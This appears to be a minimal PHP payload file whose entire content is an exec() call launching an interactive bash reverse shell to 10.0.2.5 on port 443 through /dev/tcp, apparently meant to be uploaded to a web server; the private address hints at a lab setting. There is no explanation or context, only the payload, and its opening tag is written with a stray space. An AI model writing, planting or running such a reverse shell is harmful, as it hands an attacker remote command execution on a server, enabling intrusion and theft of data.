<? php

exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.5/443 0>&1' ");
?>
